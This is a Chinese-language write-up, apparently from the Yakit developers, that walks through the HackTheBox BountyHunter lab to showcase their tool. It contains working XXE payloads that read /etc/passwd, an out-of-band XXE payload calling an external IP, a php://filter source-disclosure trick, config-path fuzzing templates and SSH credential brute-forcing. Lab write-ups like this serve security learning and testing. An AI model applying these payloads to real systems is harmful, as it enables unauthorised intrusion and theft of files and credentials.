> 一份来自官方的 Yakit 实战案例。

# 0x00 背景

当我们说单兵装备的时候，我们通常在说
“我们有什么功能？”，但是如何保证我们的功能是真的有效的？或者如何自我更新迭代，更新更好的插件，更优秀的贴近实战的功能？

虽然一些用户会无私地给我们一些正向的反馈，对于研发团队来说，这并不够，我们需要更加一手的新鲜的实战演练战场。与此同时，一些实战中的案例并不适合放在这些部分给大家做展示，

为此，我们选择 HTB 中的一系列战场，使用 Yakit 实现针对各种靶场的测试与渗透，从而体会我们的产品 “在攻防领域” 应该怎么做？

# 0x01 HTB-BountyHunter

我们选择一个看起来还比较贴近实战的靶场：HTB BountyHunter

![1651201336_626b5538817e915c9a28b.jpg!small?1651201336798](https://image.3001.net/images/20220429/1651201336_626b5538817e915c9a28b.jpg!small?1651201336798)

# 0x02 起手：确定攻击路径

大致观察之后，我们最直接的丢在 Yakit 中扫描端口开启插件跑跑看：

![1651201350_626b5546b8d202afee6f7.jpg!small?1651201351362](https://image.3001.net/images/20220429/1651201350_626b5546b8d202afee6f7.jpg!small?1651201351362)

![1651201597_626b563d1a539e98b18cc.jpg!small?1651201597486](https://image.3001.net/images/20220429/1651201597_626b563d1a539e98b18cc.jpg!small?1651201597486)

初步看了一下，22 端口爆破和 80 的普通 Web 应该是两个入口，爆破简单看了一下：

    
    
    "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2\r\n"
    [FAIL]: redis:\\-:root@10.129.95.166:6379
    [FAIL]: mongodb:\\admin:root@10.129.95.166
    [WARN] 2022-04-21 17:37:58 +0800 [default:ssh.go:86] dial ssh://10.129.95.166:22 failed: ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
    [FAIL]: ssh:\\root:123456@10.129.95.166:22
    [WARN] 2022-04-21 17:38:05 +0800 [default:ssh.go:86] dial ssh://10.129.95.166:22 failed: ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
    [FAIL]: ssh:\\test:123456@10.129.95.166
    [WARN] 2022-04-21 17:38:11 +0800 [default:ssh.go:86] dial ssh://10.129.95.166:22 failed: ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
    [FAIL]: ssh:\\oracle:123456@10.129.95.166

一般这种情况爆破进去应该是不太可能了，入口应该还是在 Web，于是我们使用 MITM
劫持一些浏览器请求，抓包看一下历史记录，初步点点点大概看了一下，记录了一下操作流程如下：

![1651201171_626b549326d56ce44b530.png!small?1651201172471](https://image.3001.net/images/20220429/1651201171_626b549326d56ce44b530.png!small?1651201172471)

![1651201222_626b54c6a9fe2023d3f44.png!small?1651201223738](https://image.3001.net/images/20220429/1651201222_626b54c6a9fe2023d3f44.png!small?1651201223738)

![1651201247_626b54dfeb3acc863570e.png!small?1651201250622](https://image.3001.net/images/20220429/1651201247_626b54dfeb3acc863570e.png!small?1651201250622)

![1651201282_626b550200458e5cac443.png!small?1651201284867](https://image.3001.net/images/20220429/1651201282_626b550200458e5cac443.png!small?1651201284867)

当我们大致发现了可以测试的参数之后，我们可以尝试对这个包进行手动的测试看看：

  1. 我们发现这个数据包的参数是 base64 编码后的结果，实际解开是一个 xml
  2. 这个请求可被重放

![1651201669_626b568595d3be1f8a476.jpg!small?1651201669977](https://image.3001.net/images/20220429/1651201669_626b568595d3be1f8a476.jpg!small?1651201669977)

# 0x03 XXE 漏洞检查

我们看到参数是 XML 的时候，马上反应过来这应该是一个 XXE 漏洞，那么其实非常简单地，我们应该写一个可以用来测试的脚本：

![1651202396_626b595c44c94367aa690.jpg!small?1651202397055](https://image.3001.net/images/20220429/1651202396_626b595c44c94367aa690.jpg!small?1651202397055)

为此，我们使用`poc.HTTP`可以快速编写针对一个数据包的检测发送与测试，其实相当于一个可编程和可自动化的 Web
Fuzzer，实际代码不超过十行，复制 Payload 改一改就可以达到我们测试的目的。

我们使用上述脚本，可以做到一边修改明文 XML，一边写一些正则或者 Glob 规则来检查结果有啥敏感内容。

理所当然，我们应该尝试使用一些简单的方式来验证漏洞是否存在，比如说 XXE 常见回显 Payload 如下，我们可以挑选一些来自动验证：

    
    
    # 适用于能把 foo 标签回显出来的情况
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&ampxxe</foo>
     
    # 随便针对一个 XML 实体中的实体进行注入，因为我们已经发现用户输入会被回显
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <bugreport>
    <title>123</title>
    <cwe> &ampxxe </cwe>
    <cvss>123</cvss>
    <reward>123</reward>
    </bugreport>

我们尝试了以上两种方式，发现因为回显问题，只有第二种可以生效，那么我们就成功可以实现 XXE 的漏洞利用了:

![1651202408_626b59684bc6398c7526f.jpg!small?1651202408589](https://image.3001.net/images/20220429/1651202408_626b59684bc6398c7526f.jpg!small?1651202408589)

## 0x03.1 扩展：无文本回显

通过我们上一篇推文 《除了 DNSLog 之外还有别的选择吗？》我们知道，只要目标可以加在远程目标（满足 TCP 协议），就可以使用 TCP
通杀的反连检测来实现检测；

那么实际上，我们 XXE 的通用 Payload 构造十分简单，就不用再关心具体字段中有哪些内容需要展示回显之类的了。

    
    
    <?xml version="1.0" encoding="ISO-8859-1"?>
    
    <!DOCTYPE foo [
    
    <!ELEMENT abc ANY>
    
    <!ENTITY xxe SYSTEM "http://124.223.202.90:63783/">
    
    ]>
    
    <abc>&ampxxe</abc>

![1651201748_626b56d4c3b1c603948c0.jpg!small?1651201749464](https://image.3001.net/images/20220429/1651201748_626b56d4c3b1c603948c0.jpg!small?1651201749464)

# 0x04 XXE + PHP Hack

![1651201759_626b56df86e60bd633915.jpg!small?1651201760010](https://image.3001.net/images/20220429/1651201759_626b56df86e60bd633915.jpg!small?1651201760010)

我们读到了`/etc/passwd`发现，实际上`www-data`用户是存在的，说明服务器地址大概率可能没有改默认，所以尝试`/var/www/html/index.php`是很正常的操作。

  1. 读文件的话，`file://`协议会有限制
  2. 由于网站通过 php 开发，所以我们下意识认为 php xml SYSTEM 应该支持 PHP 伪协议，所以我们可以通过`php://filter/read=covert.base64-encode/resource=log_submit.php`先包含一下

> 请注意 log_submit.php 是我们已知的 PHP 文件，就是表单地址

可以批量扫描 / 爆破的配置文件其实并不多，我们使用 Web Fuzzer 爆破目录之前，使用 Codec 生成一个字典，看下我们的规则是不是正确

![1651201776_626b56f0cf1a3a8ec8c91.jpg!small?1651201777120](https://image.3001.net/images/20220429/1651201776_626b56f0cf1a3a8ec8c91.jpg!small?1651201777120)

所以我们可以通过`{{list(db|database|config)}}`... 这种标签生成一个路径文件的组合，然后批量发包测试，测试结果如下

![1651201999_626b57cfb864f297daee0.jpg!small?1651202000114](https://image.3001.net/images/20220429/1651201999_626b57cfb864f297daee0.jpg!small?1651202000114)

    
    
    GET /{{list(db|database|config|config/db|config/database|config/config)}}.{{list(php|inc)}} HTTP/1.1
    Host: 10.129.95.166
    Accept: */*
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Content-Length: 221
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
    

理所当然，我们使用 db.php 作为要读取的配置文件

![1651202057_626b58093443e2a6dc5cb.jpg!small?1651202058087](https://image.3001.net/images/20220429/1651202057_626b58093443e2a6dc5cb.jpg!small?1651202058087)

## 0x04.1 从源码发现一点线索

![1651202096_626b5830a169107d2fa30.jpg!small?1651202097232](https://image.3001.net/images/20220429/1651202096_626b5830a169107d2fa30.jpg!small?1651202097232)

其实这个网站也并没有数据库，本来想办法连数据库提权应该是不能了。碰巧爆破密码直接就出了结果。

## 0x04.2 爆破密码

属实没啥办法了，随便跑一跑算了，打开爆破，把`/etc/passwd`中的感觉可以用的用户名和刚刚拿到的密码来跑跑看。不过运气比较好，跑了几组就出了密码。

![1651202122_626b584a6dfef2f624f73.jpg!small?1651202122785](https://image.3001.net/images/20220429/1651202122_626b584a6dfef2f624f73.jpg!small?1651202122785)

# 0x05 Yakit 表现复盘

这是一个非常 Easy 的靶场，不论是从思路还是利用难度来说都非常简单，我们在这个靶场测试的过程中，其实并没有用到其他的工具去辅助测试，只通过 Yakit
自身提供的功能，编写小的脚本就完成了整个简单流程：

  

![1651202135_626b58574c5f406d10e06.jpg!small?1651202135557](https://image.3001.net/images/20220429/1651202135_626b58574c5f406d10e06.jpg!small?1651202135557)

但是实际上，并不是没有提升空间：

## 0x05.1 Web Fuzzer 的强化与高级用法

实际我们编写的脚本也并不是特别复杂，仅仅是 Payload 的改动 + 测试而已：能否让 fuzz 标签支持更复杂的 Payload 编码逻辑，不需要打开
Yak Runner，仅仅 Web Fuzzer 就能完成这个过程？

实际上，按理说我们`{{url({{base64(<xml ... />)}})`这样是最理想的，但是由于 fuzz
暂时无法支持编码嵌套，现在可用的替代方案是自己写一个`codec`插件来实现这个功能。

但是实际上在 Web Fuzzer 界面，要切换到另一个 Tab，然后写插件... 嗯...，那易用性会打很大的折扣。

如何解决这个问题呢？最理想的其实是类似 MITM “热加载” 模式，热加载 codec 代码，让流量自动经过 fuzz 标签调用我们的自定义函数。

> 我很确信，这是 Web Fuzzer 的下一个很可靠的进化方向。

## 0x05.2 端口扫描插件启示

其实在我们点击页面劫持网页内容之前，我们就可以看到端口扫描插件已经识别出这个表单了。但是由于表单不是标准的 submit 流程，是通过 JS 拼接了一个
XML 提交的后端接口，导致插件无法识别出参数和自动补充表单的内容。

![1651202180_626b5884eac6022bd3552.jpg!small?1651202181245](https://image.3001.net/images/20220429/1651202180_626b5884eac6022bd3552.jpg!small?1651202181245)

  

